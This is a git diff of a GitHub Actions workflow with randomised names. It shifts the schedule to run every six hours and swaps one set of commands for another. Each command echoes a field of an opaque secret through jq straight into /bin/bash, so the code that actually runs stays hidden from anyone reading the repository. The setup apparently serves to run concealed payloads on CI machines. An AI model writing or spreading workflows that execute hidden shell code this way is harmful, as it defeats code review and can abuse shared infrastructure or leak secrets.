@@ -1,9 +1,8 @@
 name: qiliangping4536
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 1/6 * * *'
+    - cron: '50 4/6 * * *'
 
 jobs:
   build:
@@ -12,21 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: qiliangping4536
         env:
-          hmm77: ${{ secrets.hmm77 }}
+          r353: ${{ secrets.r353 }}
         run: |
-          echo $hmm77 | jq -r .v0 | /bin/bash
-          echo $fah3 | jq -r .srg7 | /bin/bash
-          echo $cfx97 | jq -r .ct7804 | /bin/bash
-          echo $t96335 | jq -r .z60951 | /bin/bash
-          echo $gzgya53 | jq -r .ajpyf4332 | /bin/bash
-          echo $ixl7137 | jq -r .z9 | /bin/bash
-          echo $hgso9165 | jq -r .c95536 | /bin/bash
-          echo $sbday82 | jq -r .xxqk86 | /bin/bash
-          echo $o629 | jq -r .a5729 | /bin/bash
-          echo $yl64373 | jq -r .jfwfd25170 | /bin/bash
-          echo $msmzd39744 | jq -r .ydpme016 | /bin/bash
-          echo $qldt0800 | jq -r .kqdw91135 | /bin/bash
-          echo $ufg9 | jq -r .rp2451 | /bin/bash
-          echo $xmiwi08100 | jq -r .h2 | /bin/bash
-          echo $w2 | jq -r .ac0 | /bin/bash
+          echo $r353 | jq -r .m336 | /bin/bash
+          echo $ij8 | jq -r .enih460 | /bin/bash
+          echo $a730 | jq -r .te625 | /bin/bash
+          echo $dg70 | jq -r .fcc74664 | /bin/bash
+          echo $fi492 | jq -r .u665 | /bin/bash
+          echo $fwd667 | jq -r .bihsh8584 | /bin/bash
 
